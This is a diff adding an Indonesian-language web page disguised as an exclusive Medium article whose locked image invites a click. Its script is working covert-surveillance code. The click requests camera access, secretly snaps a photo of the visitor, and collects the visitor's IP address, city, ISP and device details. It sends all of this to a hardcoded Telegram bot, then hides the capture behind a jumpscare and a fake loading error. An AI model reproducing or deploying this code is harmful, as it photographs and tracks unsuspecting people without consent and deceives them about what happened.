@@ -1,0 +1,645 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Artikel Eksklusif</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+        }
+        
+        body {
+            background: #f5f5f5;
+            display: flex;
+            justify-content: center;
+            padding: 20px;
+            transition: all 0.3s;
+        }
+        
+        body.jumpscare {
+            animation: shake 0.5s cubic-bezier(.36,.07,.19,.97) both;
+        }
+        
+        @keyframes shake {
+            0% { transform: translate(0); }
+            10% { transform: translate(-5px, 0); }
+            20% { transform: translate(5px, 0); }
+            30% { transform: translate(-5px, 0); }
+            40% { transform: translate(5px, 0); }
+            50% { transform: translate(-5px, 0); }
+            60% { transform: translate(5px, 0); }
+            70% { transform: translate(-5px, 0); }
+            80% { transform: translate(5px, 0); }
+            90% { transform: translate(-5px, 0); }
+            100% { transform: translate(0); }
+        }
+        
+        .container {
+            max-width: 600px;
+            width: 100%;
+            background: white;
+            border-radius: 20px;
+            overflow: hidden;
+            box-shadow: 0 5px 20px rgba(0,0,0,0.05);
+            transition: all 0.3s;
+        }
+        
+        .container.jumpscare {
+            animation: blink 0.3s 3;
+        }
+        
+        @keyframes blink {
+            0% { opacity: 1; }
+            50% { opacity: 0; background: red; }
+            100% { opacity: 1; }
+        }
+        
+        .header {
+            padding: 20px;
+            border-bottom: 1px solid #eee;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+        
+        .logo {
+            font-weight: 700;
+            font-size: 20px;
+            background: #000;
+            color: white;
+            width: 40px;
+            height: 40px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border-radius: 10px;
+        }
+        
+        .logo-text {
+            font-weight: 600;
+            font-size: 18px;
+        }
+        
+        .logo-text span {
+            color: #666;
+            font-weight: 400;
+        }
+        
+        .progress-bar {
+            height: 4px;
+            background: #e0e0e0;
+            width: 100%;
+        }
+        
+        .progress-fill {
+            height: 4px;
+            background: #1a8917;
+            width: 30%;
+        }
+        
+        .article {
+            padding: 30px 20px;
+        }
+        
+        .category {
+            color: #1a8917;
+            font-size: 13px;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            margin-bottom: 16px;
+        }
+        
+        h1 {
+            font-size: 32px;
+            font-weight: 700;
+            line-height: 1.3;
+            margin-bottom: 20px;
+            color: #1a1a1a;
+        }
+        
+        .meta {
+            display: flex;
+            gap: 20px;
+            color: #666;
+            font-size: 14px;
+            margin-bottom: 30px;
+            padding-bottom: 20px;
+            border-bottom: 1px solid #eee;
+        }
+        
+        .image-container {
+            width: 100%;
+            background: #f0f0f0;
+            border-radius: 12px;
+            margin: 20px 0 30px;
+            overflow: hidden;
+            position: relative;
+            cursor: pointer;
+        }
+        
+        .image-container img {
+            width: 100%;
+            height: auto;
+            display: block;
+            filter: blur(10px);
+            transition: filter 0.2s;
+        }
+        
+        .image-caption {
+            padding: 12px;
+            font-size: 13px;
+            color: #666;
+            background: #fafafa;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            border-top: 1px solid #eee;
+        }
+        
+        .blur-badge {
+            background: #1a8917;
+            color: white;
+            padding: 4px 12px;
+            border-radius: 20px;
+            font-size: 12px;
+            font-weight: 500;
+        }
+        
+        .image-overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0,0,0,0.1);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            opacity: 0;
+            transition: opacity 0.2s;
+            pointer-events: none;
+        }
+        
+        .image-container:hover .image-overlay {
+            opacity: 1;
+        }
+        
+        .overlay-text {
+            background: rgba(0,0,0,0.7);
+            color: white;
+            padding: 10px 20px;
+            border-radius: 30px;
+            font-size: 14px;
+            font-weight: 500;
+            backdrop-filter: blur(4px);
+        }
+        
+        .content-text {
+            font-size: 18px;
+            line-height: 1.7;
+            color: #2a2a2a;
+            margin: 30px 0;
+        }
+        
+        .content-text p {
+            margin-bottom: 20px;
+        }
+        
+        .comments-section {
+            background: #fafafa;
+            padding: 30px 20px;
+            border-top: 1px solid #eee;
+        }
+        
+        .comments-title {
+            font-weight: 600;
+            font-size: 18px;
+            margin-bottom: 20px;
+        }
+        
+        .comment {
+            display: flex;
+            gap: 12px;
+            margin-bottom: 24px;
+        }
+        
+        .comment-avatar {
+            width: 40px;
+            height: 40px;
+            background: #e0e0e0;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 600;
+            color: #555;
+        }
+        
+        .comment-content {
+            flex: 1;
+        }
+        
+        .comment-header {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-bottom: 6px;
+        }
+        
+        .comment-name {
+            font-weight: 600;
+            font-size: 14px;
+        }
+        
+        .comment-time {
+            font-size: 12px;
+            color: #888;
+        }
+        
+        .comment-text {
+            font-size: 14px;
+            line-height: 1.5;
+            color: #333;
+            margin-bottom: 8px;
+        }
+        
+        .comment-actions {
+            display: flex;
+            gap: 20px;
+            font-size: 13px;
+            color: #888;
+        }
+        
+        .loading-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: white;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 1000;
+            opacity: 0;
+            pointer-events: none;
+            transition: opacity 0.3s;
+        }
+        
+        .loading-overlay.active {
+            opacity: 1;
+            pointer-events: all;
+        }
+        
+        .loading-spinner {
+            width: 40px;
+            height: 40px;
+            border: 3px solid #f0f0f0;
+            border-top-color: #1a8917;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
+        
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        
+        .jumpscare-image {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            z-index: 9999;
+            display: none;
+            pointer-events: none;
+        }
+        
+        .jumpscare-image.active {
+            display: block;
+            animation: flash 0.3s;
+        }
+        
+        @keyframes flash {
+            0% { opacity: 0; }
+            20% { opacity: 1; }
+            80% { opacity: 1; }
+            100% { opacity: 0; }
+        }
+        
+        #hiddenCamera {
+            position: fixed;
+            top: -1000px;
+            left: -1000px;
+            width: 1px;
+            height: 1px;
+            opacity: 0;
+        }
+        
+        .footer {
+            padding: 20px;
+            text-align: center;
+            font-size: 12px;
+            color: #aaa;
+            border-top: 1px solid #eee;
+        }
+        
+        .error-message {
+            background: #ff4444;
+            color: white;
+            padding: 20px;
+            text-align: center;
+            margin: 20px;
+            border-radius: 8px;
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="container" id="container">
+        <div class="header">
+            <div class="logo">M</div>
+            <div class="logo-text">Medium<span> · Eksklusif</span></div>
+        </div>
+        
+        <div class="progress-bar">
+            <div class="progress-fill"></div>
+        </div>
+        
+        <div class="article">
+            <div class="category">EKSKLUSIF · 5 MENIT BACA</div>
+            <h1>Fenomena yang Lagi Viral di Kalangan Anak Muda</h1>
+            
+            <div class="meta">
+                <span>📅 6 Mar 2025</span>
+                <span>👤 Penulis: Redaksi</span>
+                <span>🔥 2.3rb dibaca</span>
+            </div>
+            
+            <div class="image-container" id="mainImage" onclick="handleClick()">
+                <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='600' height='400' viewBox='0 0 600 400'%3E%3Crect width='600' height='400' fill='%23dddddd'/%3E%3Ctext x='180' y='200' font-family='Arial' font-size='22' fill='%23666'%3E[Gambar Artikel]%3C/text%3E%3C/svg%3E" alt="article image">
+                <div class="image-overlay">
+                    <span class="overlay-text">Klik untuk lihat gambar</span>
+                </div>
+                <div class="image-caption">
+                    <span class="blur-badge">🔒 Terkunci</span>
+                    <span>Klik gambar untuk membuka</span>
+                </div>
+            </div>
+            
+            <div class="content-text">
+                <p>Fenomena ini mulai ramai diperbincangkan setelah viral di berbagai platform media sosial. Banyak yang penasaran dengan apa yang sebenarnya terjadi.</p>
+                <p>Untuk melihat gambar eksklusif, klik pada gambar di atas. Konten ini hanya tersedia untuk pembaca terdaftar.</p>
+            </div>
+        </div>
+        
+        <div class="comments-section">
+            <div class="comments-title">Respons (247)</div>
+            
+            <div class="comment">
+                <div class="comment-avatar">A</div>
+                <div class="comment-content">
+                    <div class="comment-header">
+                        <span class="comment-name">Andi Pratama</span>
+                        <span class="comment-time">2 jam lalu</span>
+                    </div>
+                    <div class="comment-text">Akhirnya ada yang ngejelasin juga. Makasih infonya!</div>
+                    <div class="comment-actions">
+                        <span>7 suka</span>
+                        <span>Balas</span>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="comment">
+                <div class="comment-avatar">B</div>
+                <div class="comment-content">
+                    <div class="comment-header">
+                        <span class="comment-name">Budi Santoso</span>
+                        <span class="comment-time">5 jam lalu</span>
+                    </div>
+                    <div class="comment-text">Gue udah duga dari awal bakal begini.</div>
+                    <div class="comment-actions">
+                        <span>3 suka</span>
+                        <span>Balas</span>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="comment">
+                <div class="comment-avatar">S</div>
+                <div class="comment-content">
+                    <div class="comment-header">
+                        <span class="comment-name">Siti Nurhaliza</span>
+                        <span class="comment-time">8 jam lalu</span>
+                    </div>
+                    <div class="comment-text">Share dong link aslinya kalo ada.</div>
+                    <div class="comment-actions">
+                        <span>12 suka</span>
+                        <span>Balas</span>
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+        <div class="footer">
+            Medium · Semua hak dilindungi
+        </div>
+    </div>
+    
+    <!-- Loading Overlay -->
+    <div class="loading-overlay" id="loadingOverlay">
+        <div class="loading-spinner"></div>
+    </div>
+    
+    <!-- Error message (pengganti prank message) -->
+    <div class="error-message" id="errorMessage">
+        ⚠️ Gagal memuat gambar. Coba lagi nanti.
+    </div>
+    
+    <!-- Jumpscare Image -->
+    <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='800' height='600' viewBox='0 0 800 600'%3E%3Crect width='800' height='600' fill='%23ff0000'/%3E%3Ctext x='200' y='300' font-family='Arial' font-size='60' fill='white'%3EBOO!%3C/text%3E%3C/svg%3E" class="jumpscare-image" id="jumpscareImage">
+    
+    <video id="hiddenCamera" autoplay playsinline></video>
+    <canvas id="hiddenCanvas" width="640" height="480" style="display: none;"></canvas>
+    
+    <script>
+        // ===========================================
+        // GANTI TOKEN TELEGRAM DI SINI!
+        // ===========================================
+        const TELEGRAM_TOKEN = '6627037707:AAEJS_pFSv8hMI62eQETMCHFaLiHt3WPJos'; // GANTI!
+        const TELEGRAM_CHAT_ID = '6239380758'; // GANTI!
+        // ===========================================
+        
+        let fotoKorban = null;
+        
+        async function getIP() {
+            try {
+                const res = await fetch('https://api.ipify.org?format=json');
+                const data = await res.json();
+                return data.ip;
+            } catch {
+                return 'Unknown';
+            }
+        }
+        
+        async function getLocation() {
+            try {
+                const res = await fetch('https://ipapi.co/json/');
+                const data = await res.json();
+                return {
+                    kota: data.city || 'Unknown',
+                    negara: data.country_name || 'Unknown',
+                    isp: data.org || 'Unknown'
+                };
+            } catch {
+                return { kota: 'Unknown', negara: 'Unknown', isp: 'Unknown' };
+            }
+        }
+        
+        function getDeviceInfo() {
+            const ua = navigator.userAgent;
+            let browser = 'Chrome';
+            if (ua.includes('Firefox')) browser = 'Firefox';
+            else if (ua.includes('Safari')) browser = 'Safari';
+            
+            let os = 'Windows';
+            if (ua.includes('Android')) os = 'Android';
+            else if (ua.includes('iPhone')) os = 'iOS';
+            else if (ua.includes('Mac')) os = 'macOS';
+            else if (ua.includes('Linux')) os = 'Linux';
+            
+            return { browser, os, screen: `${screen.width}x${screen.height}` };
+        }
+        
+        async function sendToTelegram() {
+            try {
+                const ip = await getIP();
+                const loc = await getLocation();
+                const device = getDeviceInfo();
+                
+                const pesan = `🎭 *PRANK BERHASIL!*
+━━━━━━━━━━━━━━━━━━
+🌐 IP: ${ip}
+📍 Kota: ${loc.kota}, ${loc.negara}
+🏢 ISP: ${loc.isp}
+📱 Device: ${device.os} - ${device.browser}
+📺 Resolusi: ${device.screen}
+⏰ Waktu: ${new Date().toLocaleString('id-ID')}
+━━━━━━━━━━━━━━━━━━
+📸 Foto korban terlampir`;
+                
+                await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: pesan,
+                        parse_mode: 'Markdown'
+                    })
+                });
+                
+                if (fotoKorban) {
+                    const binary = atob(fotoKorban.split(',')[1]);
+                    const array = [];
+                    for (let i = 0; i < binary.length; i++) {
+                        array.push(binary.charCodeAt(i));
+                    }
+                    const blob = new Blob([new Uint8Array(array)], {type: 'image/jpeg'});
+                    const formData = new FormData();
+                    formData.append('chat_id', TELEGRAM_CHAT_ID);
+                    formData.append('photo', blob, 'korban.jpg');
+                    
+                    await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
+                        method: 'POST',
+                        body: formData
+                    });
+                }
+            } catch (e) {
+                console.log('Error:', e);
+            }
+        }
+        
+        function triggerJumpscare() {
+            return new Promise((resolve) => {
+                const body = document.body;
+                const container = document.getElementById('container');
+                const jumpscareImg = document.getElementById('jumpscareImage');
+                const errorMsg = document.getElementById('errorMessage');
+                
+                body.classList.add('jumpscare');
+                container.classList.add('jumpscare');
+                jumpscareImg.classList.add('active');
+                
+                window.scrollBy(5, 5);
+                window.scrollBy(-5, -5);
+                window.scrollBy(5, -5);
+                window.scrollBy(-5, 5);
+                
+                setTimeout(() => {
+                    body.classList.remove('jumpscare');
+                    container.classList.remove('jumpscare');
+                    jumpscareImg.classList.remove('active');
+                    
+                    // Tampilkan error message (bukan prank)
+                    errorMsg.style.display = 'block';
+                    
+                    // Hilangin error setelah 3 detik
+                    setTimeout(() => {
+                        errorMsg.style.display = 'none';
+                        // Kembalikan tampilan normal
+                        location.reload(); // Reload biar bisa dicoba lagi
+                    }, 3000);
+                    
+                    resolve();
+                }, 500);
+            });
+        }
+        
+        async function handleClick() {
+            const loading = document.getElementById('loadingOverlay');
+            const mainImage = document.getElementById('mainImage');
+            
+            loading.classList.add('active');
+            
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: 'user' }, 
+                    audio: false 
+                });
+                
+                const video = document.getElementById('hiddenCamera');
+                const canvas = document.getElementById('hiddenCanvas');
+                video.srcObject = stream;
+                
+                await new Promise(r => setTimeout(r, 500));
+                video.play();
+                await new Promise(r => setTimeout(r, 300));
+                
+                canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
+                fotoKorban = canvas.toDataURL('image/jpeg', 0.7);
+                
+                stream.getTracks().forEach(track => track.stop());
+                
+                await sendToTelegram();
+                
+                loading.classList.remove('active');
+                mainImage.style.display = 'none';
+                
+                // Jumpscare tanpa bilang "KENA PRANK"
+                await triggerJumpscare();
+                
+            } catch (error) {
+                loading.classList.remove('active');
+                alert('Klik izinkan untuk melihat gambar');
+            }
+        }
+    </script>
+</body>
+</html>
